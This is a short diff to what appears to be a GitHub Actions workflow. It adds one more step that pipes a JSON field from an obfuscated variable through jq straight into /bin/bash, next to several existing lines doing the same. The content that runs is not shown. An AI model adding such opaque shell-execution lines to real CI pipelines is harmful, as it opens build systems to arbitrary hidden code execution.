@@ -28,6 +28,7 @@ jobs:
           echo $o0802 | jq -r .n36442 | /bin/bash
           printf '%s' "$ik20366" | jq -r .aiivg60 | /bin/bash
           echo $bqxy61427 | jq -r .itnl2 | /bin/bash
+          printf '%s' "$xo4" | jq -r .uhf3991 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
